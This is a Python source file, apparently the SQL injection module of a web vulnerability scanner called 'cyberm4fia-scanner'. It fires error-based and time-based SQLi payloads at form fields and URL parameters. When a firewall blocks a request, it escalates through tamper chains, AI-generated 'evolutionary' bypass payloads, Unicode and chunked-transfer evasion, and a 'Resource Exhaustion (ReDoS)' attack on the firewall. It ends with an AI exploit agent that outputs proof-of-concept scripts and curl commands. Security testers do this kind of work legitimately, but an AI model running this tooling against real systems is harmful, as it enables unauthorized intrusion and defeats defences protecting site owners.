"""
cyberm4fia-scanner - SQLi Module
SQL Injection detection
"""

import sys
import os
import time
import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.request import (
    get_thread_count,
    increment_vulnerability_count,
    smart_request,
)
from utils.colors import Colors, log_info, log_success, log_vuln, log_warning
from modules.payloads import (
    BLIND_SQLI_PAYLOADS,
    BLIND_SQLI_THRESHOLD,
    SQLI_PAYLOADS,
    SQLI_ERRORS,
)
from modules.smart_payload import probe_sqli_context
from concurrent.futures import ThreadPoolExecutor, as_completed


def detect_sqli(text):
    """Check response for SQL error patterns"""
    text_lower = text.lower()
    for error in SQLI_ERRORS:
        if error.lower() in text_lower:
            return error
    return None


def _check_sqli_error(
    resp, payload, target_name, url_or_action, method, data, smart_payloads, source=None
):
    """Helper to check reflection and log SQLi"""
    error = detect_sqli(resp.text)
    if error:
        increment_vulnerability_count()
        if not source:
            source = "🧠 Smart" if payload in smart_payloads else "📋 Static"
        log_vuln(f"SQLi VULNERABILITY FOUND! [{source}]")
        log_success(f"Target: {target_name} | Error: {error}")
        log_success(f"Payload: {payload}")
        return {
            "type": "SQLi_Form" if data else "SQLi_Param",
            ("field" if data else "param"): target_name,
            "payload": payload,
            "error": error,
            "url": url_or_action,
            "method": method if data else "get",
            "form_data": data if data else {},
            "source": source,
        }
    return None


def _test_sqli_form_input(inp, inputs, method, target, delay):
    """Test a single form input for SQLi (helper for threading)"""
    smart = []
    # Could add smart probe for SQLi forms here later
    all_payloads = SQLI_PAYLOADS

    for payload in all_payloads:
        data = inputs.copy()
        data[inp] = payload
        try:
            if method == "post":
                resp = smart_request("post", target, data=data, delay=delay)
            else:
                resp = smart_request("get", target, params=data, delay=delay)

            vuln_found = _check_sqli_error(
                resp, payload, inp, target, method, data, smart
            )
            if vuln_found:
                return vuln_found

            # --- SMART WAF BYPASS LOGIC ---
            from utils.waf import waf_detector

            if waf_detector.is_waf_block(resp.status_code, resp.text):
                waf_name = waf_detector.detected_waf or "Generic WAF"
                log_warning(f"WAF Block ({waf_name}) detected on form field '{inp}'")

                from utils.tamper import TamperChain

                tampers = waf_detector.get_recommended_tampers()
                if tampers:
                    log_info(
                        f"Applying auto-tamper for {waf_name}: {'+'.join(tampers)}"
                    )
                    chain = TamperChain(tampers)
                    tampered_payload = chain.apply(payload)
                    if tampered_payload != payload:
                        data[inp] = tampered_payload
                        resp_t = (
                            smart_request("post", target, data=data, delay=delay)
                            if method == "post"
                            else smart_request("get", target, params=data, delay=delay)
                        )
                        vuln_found = _check_sqli_error(
                            resp_t,
                            tampered_payload,
                            inp,
                            target,
                            method,
                            data,
                            smart,
                            source="⚡ Auto-Tamper",
                        )
                        if vuln_found:
                            return vuln_found

                        # 2. Try AI Bypass (Evolutionary Mutation Loop)
                        from utils.ai import get_ai, EvolvingWAFBypassEngine

                        ai_client = get_ai()
                        if (
                            ai_client
                            and ai_client.available
                            and waf_detector.is_waf_block(
                                resp_t.status_code, resp_t.text
                            )
                        ):
                            log_info(
                                f"🤖 Starting Evolutionary AI Mutation for {waf_name}..."
                            )
                            engine = EvolvingWAFBypassEngine(
                                ai_client, waf_name, "SQL Injection"
                            )
                            current_payload = payload

                            for iteration in range(1, 4):
                                ai_payloads = engine.mutate(current_payload, iteration)

                                for ai_p in ai_payloads:
                                    data[inp] = ai_p
                                    resp_ai = (
                                        smart_request(
                                            "post", target, data=data, delay=delay
                                        )
                                        if method == "post"
                                        else smart_request(
                                            "get", target, params=data, delay=delay
                                        )
                                    )
                                    vuln_found = _check_sqli_error(
                                        resp_ai,
                                        ai_p,
                                        inp,
                                        target,
                                        method,
                                        data,
                                        smart,
                                        source=f"🤖 AI Gen-{iteration}",
                                    )
                                    if vuln_found:
                                        return vuln_found

                                    if waf_detector.is_waf_block(
                                        resp_ai.status_code, resp_ai.text
                                    ):
                                        engine.analyze_failure(ai_p)
                                        current_payload = ai_p

                                if vuln_found:
                                    break

                            # 3. Protocol-Level Evasion (If AI failed or unavailable)
                            if not vuln_found:
                                log_info(
                                    f"🛡️ Falling back to Protocol-Level Evasion for {waf_name}..."
                                )

                                # Evasion Level 1: Unicode Normalization
                                data[inp] = payload
                                resp_ev1 = (
                                    smart_request(
                                        "post",
                                        target,
                                        data=data,
                                        delay=delay,
                                        evasion_level=1,
                                    )
                                    if method == "post"
                                    else smart_request(
                                        "get",
                                        target,
                                        params=data,
                                        delay=delay,
                                        evasion_level=1,
                                    )
                                )
                                vuln_found = _check_sqli_error(
                                    resp_ev1,
                                    payload,
                                    inp,
                                    target,
                                    method,
                                    data,
                                    smart,
                                    source="🛡️ Unicode Evasion",
                                )
                                if vuln_found:
                                    return vuln_found

                                # Evasion Level 2: Chunked Transfer
                                if waf_detector.is_waf_block(
                                    resp_ev1.status_code, resp_ev1.text
                                ):
                                    resp_ev2 = (
                                        smart_request(
                                            "post",
                                            target,
                                            data=data,
                                            delay=delay,
                                            evasion_level=2,
                                        )
                                        if method == "post"
                                        else smart_request(
                                            "get",
                                            target,
                                            params=data,
                                            delay=delay,
                                            evasion_level=2,
                                        )
                                    )
                                    vuln_found = _check_sqli_error(
                                        resp_ev2,
                                        payload,
                                        inp,
                                        target,
                                        method,
                                        data,
                                        smart,
                                        source="🧱 Chunked Evasion",
                                    )
                                    if vuln_found:
                                        return vuln_found

                                    # Evasion Level 3: WAF Resource Exhaustion (ReDoS)
                                    if waf_detector.is_waf_block(
                                        resp_ev2.status_code, resp_ev2.text
                                    ):
                                        log_warning(
                                            f"💥 Bruteforcing {waf_name} via Resource Exhaustion (Level 3)"
                                        )
                                        resp_ev3 = (
                                            smart_request(
                                                "post",
                                                target,
                                                data=data,
                                                delay=delay,
                                                evasion_level=3,
                                            )
                                            if method == "post"
                                            else smart_request(
                                                "get",
                                                target,
                                                params=data,
                                                delay=delay,
                                                evasion_level=3,
                                            )
                                        )
                                        vuln_found = _check_sqli_error(
                                            resp_ev3,
                                            payload,
                                            inp,
                                            target,
                                            method,
                                            data,
                                            smart,
                                            source="💥 ReDoS Evasion",
                                        )
                                        if vuln_found:
                                            return vuln_found

        except Exception:
            pass
    return None


def _test_sqli_param(param, params, parsed, delay):
    """Test a single URL param for SQLi (helper for threading)"""
    flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
    probe = probe_sqli_context(
        urlunparse(parsed), param, flat_params, method="get", delay=delay
    )
    smart = probe.get("smart_payloads", [])
    if smart:
        all_payloads = smart + [p for p in SQLI_PAYLOADS if p not in smart]
    else:
        all_payloads = SQLI_PAYLOADS

    for payload in all_payloads:
        test_params = params.copy()
        test_params[param] = [payload]
        test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
        try:
            resp = smart_request("get", test_url, delay=delay)
            vuln_found = _check_sqli_error(
                resp, payload, param, test_url, "get", None, smart
            )
            if vuln_found:
                return vuln_found

            # --- SMART WAF BYPASS LOGIC ---
            from utils.waf import waf_detector

            if waf_detector.is_waf_block(resp.status_code, resp.text):
                waf_name = waf_detector.detected_waf or "Generic WAF"
                log_warning(f"WAF Block ({waf_name}) detected on param '{param}'")

                from utils.tamper import TamperChain

                tampers = waf_detector.get_recommended_tampers()
                if tampers:
                    log_info(
                        f"Applying auto-tamper for {waf_name}: {'+'.join(tampers)}"
                    )
                    chain = TamperChain(tampers)
                    tampered_payload = chain.apply(payload)
                    if tampered_payload != payload:
                        test_params[param] = [tampered_payload]
                        test_url = urlunparse(
                            parsed._replace(query=urlencode(test_params, doseq=True))
                        )
                        resp_t = smart_request("get", test_url, delay=delay)
                        vuln_found = _check_sqli_error(
                            resp_t,
                            tampered_payload,
                            param,
                            test_url,
                            "get",
                            None,
                            smart,
                            source="⚡ Auto-Tamper",
                        )
                        if vuln_found:
                            return vuln_found

                        # 2. Try AI Bypass (Evolutionary Mutation Loop)
                        from utils.ai import get_ai, EvolvingWAFBypassEngine

                        ai_client = get_ai()
                        if (
                            ai_client
                            and ai_client.available
                            and waf_detector.is_waf_block(
                                resp_t.status_code, resp_t.text
                            )
                        ):
                            log_info(
                                f"🤖 Starting Evolutionary AI Mutation for {waf_name}..."
                            )
                            engine = EvolvingWAFBypassEngine(
                                ai_client, waf_name, "SQL Injection"
                            )
                            current_payload = payload

                            for iteration in range(1, 4):
                                ai_payloads = engine.mutate(current_payload, iteration)

                                for ai_p in ai_payloads:
                                    test_params[param] = [ai_p]
                                    test_url = urlunparse(
                                        parsed._replace(
                                            query=urlencode(test_params, doseq=True)
                                        )
                                    )
                                    resp_ai = smart_request(
                                        "get", test_url, delay=delay
                                    )
                                    vuln_found = _check_sqli_error(
                                        resp_ai,
                                        ai_p,
                                        param,
                                        test_url,
                                        "get",
                                        None,
                                        smart,
                                        source=f"🤖 AI Gen-{iteration}",
                                    )
                                    if vuln_found:
                                        return vuln_found

                                    if waf_detector.is_waf_block(
                                        resp_ai.status_code, resp_ai.text
                                    ):
                                        engine.analyze_failure(ai_p)
                                        current_payload = ai_p

                                if vuln_found:
                                    break

                            # 3. Protocol-Level Evasion (If AI failed or unavailable)
                            if not vuln_found:
                                log_info(
                                    f"🛡️ Falling back to Protocol-Level Evasion for {waf_name}..."
                                )

                                # Evasion Level 1: Unicode Normalization
                                test_params[param] = [payload]
                                test_url = urlunparse(
                                    parsed._replace(
                                        query=urlencode(test_params, doseq=True)
                                    )
                                )
                                resp_ev1 = smart_request(
                                    "get", test_url, delay=delay, evasion_level=1
                                )
                                vuln_found = _check_sqli_error(
                                    resp_ev1,
                                    payload,
                                    param,
                                    test_url,
                                    "get",
                                    None,
                                    smart,
                                    source="🛡️ Unicode Evasion",
                                )
                                if vuln_found:
                                    return vuln_found

                                # Evasion Level 2: Chunked Transfer
                                if waf_detector.is_waf_block(
                                    resp_ev1.status_code, resp_ev1.text
                                ):
                                    resp_ev2 = smart_request(
                                        "get", test_url, delay=delay, evasion_level=2
                                    )
                                    vuln_found = _check_sqli_error(
                                        resp_ev2,
                                        payload,
                                        param,
                                        test_url,
                                        "get",
                                        None,
                                        smart,
                                        source="🧱 Chunked Evasion",
                                    )
                                    if vuln_found:
                                        return vuln_found

        except Exception:
            pass
    return None


def scan_sqli(url, forms, delay, threads=None):
    """Scan for SQL injection vulnerabilities (threaded)"""
    from utils.tamper import get_tamper_chain

    if threads is None:
        threads = get_thread_count()

    # Apply tamper chain for WAF bypass variants
    chain = get_tamper_chain()
    payloads = list(SQLI_PAYLOADS)
    if chain.active:
        payloads = chain.apply_list(payloads)

    log_info(f"Testing SQLi with {len(payloads)} payloads ({threads} threads)...")
    vulns = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []

        # Submit form input tests
        for form in forms:
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            # Extract inputs with values to preserve tokens (CSRF fix)
            inputs = {}
            for i in form.find_all(["input", "textarea", "select"]):
                if i.get("name"):
                    inputs[i.get("name")] = i.get(
                        "value", "1"
                    )  # Default to '1' if no value

            if not inputs:
                continue

            for inp in inputs:
                # Still test all inputs, including hidden ones if they are vulnerable
                # But maybe skip submit buttons? Usually safe to test.
                if inp.lower() in ["submit", "btnsubmit", "login"]:
                    continue

                futures.append(
                    executor.submit(
                        _test_sqli_form_input, inp, inputs, method, target, delay
                    )
                )

        # Submit URL param tests
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            futures.append(
                executor.submit(_test_sqli_param, param, params, parsed, delay)
            )

        # Collect results
        for future in as_completed(futures):
            try:
                result = future.result()
                if result:
                    vulns.append(result)
            except Exception:
                pass

    # ── AI Exploit Agent (Final Escalation) ──
    if not vulns and params:
        try:
            from utils.ai_exploit_agent import get_exploit_agent, ExploitContext
            agent = get_exploit_agent()
            if agent and agent.available:
                from utils.waf import waf_detector
                waf_name = getattr(waf_detector, "detected_waf", "") or ""

                for param in params:
                    ctx = ExploitContext(
                        url=url,
                        param=param,
                        vuln_type="SQLi",
                        waf=waf_name,
                        http_method="GET",
                    )
                    result = agent.exploit_sqli(ctx)
                    if result and result.success:
                        from utils.request import increment_vulnerability_count
                        increment_vulnerability_count()
                        log_info(f"[!!!] SQLi in: {param} [🤖 AI Agent Gen-{result.iteration}]")
                        vulns.append({
                            "type": "SQLi",
                            "param": param,
                            "payload": result.payload,
                            "url": url,
                            "source": f"🤖 AI Agent (confidence: {result.confidence:.0f}%)",
                            "evidence": result.evidence[:200],
                            "ai_curl": result.curl_command,
                            "ai_poc_script": result.python_script,
                            "ai_nuclei": result.nuclei_template,
                        })
                        break
        except ImportError:
            pass

    return vulns


def scan_blind_sqli(url, forms, delay):
    """Scan for blind SQL injection using time-based detection"""
    log_info(f"Testing Blind SQLi with {len(BLIND_SQLI_PAYLOADS)} payloads...")
    vulns = []

    # Test forms for Blind SQLi
    for form in forms:
        action = form.get("action") or url
        method = form.get("method", "get").lower()
        target = urljoin(url, action)

        # Extract inputs with values
        inputs = {}
        for i in form.find_all(["input", "textarea", "select"]):
            if i.get("name"):
                inputs[i.get("name")] = i.get("value", "1")

        if not inputs:
            continue

        for inp in inputs:
            # Skip Submit buttons as they rarely contain SQLi and cause false positives/delays
            if inp.lower() in ["submit", "btnsubmit", "login", "security"]:
                continue

            for payload in BLIND_SQLI_PAYLOADS:
                # Use only sleep payloads or time-based ones
                if (
                    "SLEEP" in payload.upper()
                    or "pg_sleep" in payload.lower()
                    or "WAITFOR" in payload.upper()
                ):
                    # Preserve original values logic
                    data = inputs.copy()
                    data[inp] = payload

                    # Show progress (overwrite line)
                    sys.stdout.write(f"\r[*] Testing {inp}: {payload[:40]:<40}")
                    sys.stdout.flush()

                    try:
                        start = time.time()
                        smart_request(
                            method,
                            target,
                            data=data if method == "post" else None,
                            params=data if method != "post" else None,
                            delay=0,
                        )
                        elapsed = time.time() - start

                        if elapsed > BLIND_SQLI_THRESHOLD:
                            # Baseline check
                            base_data = inputs.copy()
                            base_data[inp] = "cybm4f1a_sqli_baseline"
                            start_base = time.time()
                            smart_request(
                                method,
                                target,
                                data=base_data if method == "post" else None,
                                params=base_data if method != "post" else None,
                                delay=0,
                            )
                            base_elapsed = time.time() - start_base

                            if base_elapsed < 2.0:
                                # Clear progress line
                                sys.stdout.write("\r" + " " * 60 + "\r")
                                sys.stdout.flush()

                                increment_vulnerability_count()

                                log_vuln("BLIND SQLi VULNERABILITY FOUND!")
                                log_success(
                                    f"Target slept for {elapsed:.2f}s! (Baseline: {base_elapsed:.2f}s, Threshold: {BLIND_SQLI_THRESHOLD}s)"
                                )
                                print(
                                    f"    {Colors.GREEN}└──> Payload confirmed: {payload}{Colors.END}"
                                )

                                vulns.append(
                                    {
                                        "type": "Blind_SQLi_Form",
                                        "field": inp,
                                        "payload": payload,
                                        "response_time": elapsed,
                                        "url": target,
                                        "method": method,
                                    }
                                )
                                break
                            else:
                                sys.stdout.write("\r" + " " * 60 + "\r")
                                sys.stdout.flush()
                                log_info(
                                    f"Ignored SQLi false positive on {inp} (Network delay: {base_elapsed:.2f}s)"
                                )
                            break  # Found one payload that works, move to next input
                    except httpx.RequestError:
                        pass  # Individual blind form payload failure

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    for param in params:
        for payload in BLIND_SQLI_PAYLOADS:
            if "SLEEP" in payload.upper() or "pg_sleep" in payload.lower():
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = urlunparse(
                    parsed._replace(query=urlencode(test_params, doseq=True))
                )

                try:
                    start = time.time()
                    smart_request("get", test_url, delay=0)  # No extra delay for timing
                    elapsed = time.time() - start

                    if elapsed > BLIND_SQLI_THRESHOLD:
                        # Baseline check
                        base_params = params.copy()
                        base_params[param] = ["cybm4f1a_sqli_baseline"]
                        base_url = urlunparse(
                            parsed._replace(query=urlencode(base_params, doseq=True))
                        )
                        start_base = time.time()
                        smart_request("get", base_url, delay=0)
                        base_elapsed = time.time() - start_base

                        if base_elapsed < 2.0:
                            increment_vulnerability_count()

                            log_vuln("BLIND SQLi VULNERABILITY FOUND!")
                            log_success(
                                f"Param: {param} | Delay: {elapsed:.2f}s (Baseline: {base_elapsed:.2f}s)"
                            )
                            log_success(f"Payload: {payload}")

                            vulns.append(
                                {
                                    "type": "Blind_SQLi_Param",
                                    "param": param,
                                    "payload": payload,
                                    "response_time": elapsed,
                                    "url": test_url,
                                }
                            )
                            break
                        else:
                            log_info(
                                f"Ignored SQLi false positive on {param} (Network delay: {base_elapsed:.2f}s)"
                            )
                            break
                except Exception:
                    pass  # Individual blind param payload failure

    return vulns
